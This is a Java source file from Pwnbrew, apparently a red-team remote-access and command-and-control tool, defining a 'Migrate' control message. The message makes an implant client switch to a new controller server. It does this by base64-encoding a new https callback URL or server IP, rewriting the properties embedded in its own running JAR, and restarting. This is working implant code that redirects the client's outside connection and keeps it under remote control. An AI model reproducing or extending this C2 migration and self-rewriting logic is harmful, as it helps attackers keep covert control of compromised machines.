/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
* Migrate.java
*
* Created on June 7, 2013, 11:01:01 PM
*/

package pwnbrew.network.control.messages;


import java.io.File;
import java.io.IOException;
import java.util.logging.Level;
import pwnbrew.ClientConfig;
import pwnbrew.Pwnbrew;
import pwnbrew.manager.CommManager;
import pwnbrew.network.ControlOption;
import pwnbrew.log.RemoteLog;
import pwnbrew.misc.Base64Converter;
import pwnbrew.misc.Constants;
import pwnbrew.misc.DebugPrinter;
import pwnbrew.misc.LoaderUtilities;
import pwnbrew.misc.Utilities;
import pwnbrew.network.ClientPortRouter;

/**
 *
 *  
 */
public class Migrate extends ControlMessage {
    
    private String theConnectStr = "";
    
    //Class name
    private static final String NAME_Class = Migrate.class.getSimpleName();
 
    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public Migrate( byte[] passedId ) {
        super(passedId);
    }
    
     //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){      
        theConnectStr = new String(tempTlv.getValue());   
        return true;
    }
    
    //===============================================================
    /**
     * Returns the number of seconds to sleep before trying to connect to the server.
     *
     * @return
     */
    public String getConnectString() {
        return theConnectStr;
    }
    
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( CommManager passedManager ) {        
        
        //Remove JAR if that's how we are running
        File theClassPath;
        ClassLoader aClassLoader;
        String properties;
        String connectStr;
        String propLabel;
        
        //Try and connect to the new server
        String[] connectArr = getConnectString().split(":");
        
        //Get the IP and ports
        if(connectArr.length != 2){
            return;
        }
        
        String theServerIp = connectArr[0].trim();        
        try {
            
            //Get the port router
            int msgPort = ClientConfig.getConfig().getSocketPort();
            ClientPortRouter aCPR = (ClientPortRouter)passedManager.getPortRouter(msgPort);
            
            //Check if we are coming from a stager 
            if( Utilities.isStaged() ){
                
                try {
                    
                    Class stagerClass = Class.forName("stager.Stager");
                    theClassPath = Utilities.getClassPath();
                    aClassLoader = stagerClass.getClassLoader();            

                    //Get append spaces to avoid == at the end
                    StringBuilder aSB = new StringBuilder()
                        .append("https://")
                        .append( getConnectString().trim() )
                        .append("/");
                    int neededChars = aSB.length() % 3;
                    for( int i = 0; i < neededChars + 1; i++){
                        aSB.append(" ");
                    }

                    //Decode the base64   
                    DebugPrinter.printMessage(NAME_Class, "Migrating to " + aSB.toString());
                    connectStr = Base64Converter.encode( aSB.toString().getBytes() );
                    properties = Constants.PROP_FILE;
                    propLabel = Constants.URL_LABEL;    
                    
                    //Close the loader
                    Utilities.restart( passedManager, false, 5000 ); 

                } catch (ClassNotFoundException ex ){
                    ex = null;
                    return;
                }

            } else {

                theClassPath = Utilities.getClassPath(); 
                aClassLoader = ClassLoader.getSystemClassLoader();
                properties = Constants.PROP_FILE;            

                //Set the IP
                connectStr = theServerIp;
                propLabel = Constants.SERV_LABEL;
                
                //Tell it not to reconnect
                aCPR.setReconnectFlag(false);
                passedManager.shutdown(); 

            } 
           
            if( theClassPath != null && theClassPath.isFile() ){ 

                //Close the loader
                LoaderUtilities.unloadLibs( aClassLoader );

                //Update the jar
                Utilities.updateJarProperties( theClassPath, properties, propLabel, connectStr );

            }   
            
        } catch (IOException ex) {
            RemoteLog.log(Level.WARNING, NAME_Class, "evaluate()", ex.getMessage(), ex);        
        } 
                    
    }

}/* END CLASS Migrate */
